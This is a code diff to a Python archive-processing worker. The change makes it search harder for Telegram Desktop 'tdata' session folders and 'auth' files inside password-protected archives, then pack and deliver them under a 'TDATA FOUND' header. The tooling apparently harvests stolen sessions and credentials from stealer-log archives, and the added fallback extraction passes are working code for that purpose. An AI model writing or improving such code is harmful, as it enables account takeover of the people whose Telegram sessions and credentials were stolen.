@@ -1178,7 +1178,8 @@ def process(task):
         else:
             finish(task, "error", err=why)
         return
-    shutil.rmtree(WORK / "dl", ignore_errors=True)
+    shutil.rmtree(WORK / "dl", ignore_errors=True) \
+        if not task.get("tdata") else None
     packed, auths = search_pack(WORK / "ex", bool(task.get("auth")))
     if stop():
         shutil.rmtree(WORK, ignore_errors=True)
@@ -1189,7 +1190,26 @@ def process(task):
     auth_sent, auth_fid = deliver_auth(auths) if want_auth else (False, None)
     td_zip, td_total = None, 0
     if want_tdata:
-        td_zip, td_total = pack_tdata(find_tdata(WORK / "ex"))
+        tdirs = find_tdata(WORK / "ex")
+        if not tdirs:
+            # the filtered extract skips tdata binaries — pull them now
+            st("extract", 45, msg="tdata not in filtered extract — pulling")
+            try:
+                _extract(arc, WORK / "tdex", task.get("passwords") or [],
+                         ["*tdata*"])
+            except Exception as e:
+                sys.stdout.write("tdex pass: %s\n" % e); sys.stdout.flush()
+            tdirs = find_tdata(WORK / "ex") + find_tdata(WORK / "tdex")
+        if not tdirs:
+            st("extract", 45, msg="full extract to hunt tdata folders")
+            try:
+                _extract(arc, WORK / "tdfull", task.get("passwords") or [], None)
+            except Exception as e:
+                sys.stdout.write("tdfull pass: %s\n" % e); sys.stdout.flush()
+            tdirs = find_tdata(WORK / "tdfull")
+        if not tdirs:
+            tdirs = find_tdata(WORK / "ex")   # final sweep, signature rules too
+        td_zip, td_total = pack_tdata(tdirs)
     td_sent = False
     if td_zip:
         cap = (f"{gold_header('TDATA FOUND', esc('%d folder%s found'
